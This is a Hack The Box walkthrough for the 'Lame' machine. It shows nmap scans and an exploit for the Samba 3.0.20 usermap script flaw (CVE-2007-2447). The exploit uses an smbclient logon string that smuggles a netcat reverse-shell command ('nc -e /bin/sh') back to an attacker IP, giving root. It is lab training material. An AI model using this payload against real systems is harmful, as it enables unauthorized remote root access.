---
title: "HTB: Lame"
description: "Complete walkthrough for Lame machine from Hack The Box."
publishDate: "2024-05-10"
difficulty: "Easy"
os: "Linux"
ip: "10.10.10.3"
tags: ["Samba", "Metasploit", "CVE-2007-2447"]
completed: true
---

# HTB: Lame

## Enumeration

We start with an initial port scan using `nmap` to discover open ports and services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
```

Next, perform targeted script and version scanning on discovered open ports:

```bash
nmap -sCV -p 21,22,139,445 10.10.10.3 -oN targeted
```

## Exploitation

The detected Samba version (Samba 3.0.20) is vulnerable to remote command execution via the `usermap script` flaw (CVE-2007-2447).

Start a netcat listener:

```bash
nc -lvnp 4444
```

Then trigger the exploit using `smbclient` by executing a reverse shell command:

```bash
smbclient //10.10.10.3/tmp -c 'logon "/=`nohup nc -e /bin/sh 10.10.14.2 4444`"'
```

## Post-Exploitation

Once the shell connects, verify the effective user privileges:

```bash
whoami
id
```

The shell grants direct `root` access.
